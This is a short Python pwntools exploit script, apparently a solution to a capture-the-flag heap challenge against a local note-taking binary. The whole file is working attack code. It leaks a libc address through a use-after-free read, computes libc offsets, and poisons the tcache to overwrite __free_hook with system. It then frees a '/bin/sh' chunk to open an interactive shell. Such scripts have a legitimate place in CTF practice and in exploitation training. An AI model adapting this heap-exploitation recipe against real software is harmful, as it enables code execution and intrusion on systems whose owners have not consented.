from pwn import *

elf = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
global p

index = 0


def add_note(note):
    p.recvuntil(b"Exit\n")
    p.sendline(b"1")
    p.recvuntil(b"note\n")
    p.sendline(note)

def del_note(id):
    p.recvuntil(b"Exit\n")
    p.sendline(b"2")
    p.recvuntil(b"delete?\n")
    p.sendline(id)

def edit_note(id, note):
    p.recvuntil(b"Exit\n")
    p.sendline(b"3")
    p.recvuntil(b"edit?\n")
    p.sendline(id)
    p.sendline(note)

def read_note(id):
    p.recvuntil(b"Exit\n")
    p.sendline(b"4")
    p.recvuntil(b"read?\n")
    p.sendline(id)
    return p.recvuntil(b"\nEnter", drop=True)


def unsorted_note(note):
    p.recvuntil(b"Exit\n")
    p.sendline(b"10")
    p.recvuntil(b"note\n")
    p.sendline(note)


p = process(elf.path)

unsorted_note(b"aaaaaaaaaaa")
unsorted_note(b"bbbbbbbbbbb")


del_note(b"0")
del_note(b"1")


leak = u64(read_note(b"1").ljust(8, b"\x00"))

libc.address = leak - 2014176

info("libc @0x%hx" % libc.address)



add_note(b"A"*8)
add_note(b"B"*8)


del_note(b"1")
del_note(b"0")

malloc_hook = libc.address + 2014064
free_hook   = libc.address + 2026280
system      = libc.address + 349200

edit_note(b"0", p64(free_hook))


add_note(b"/bin/sh\x00")
add_note(p64(system))



del_note(b"6")



p.interactive()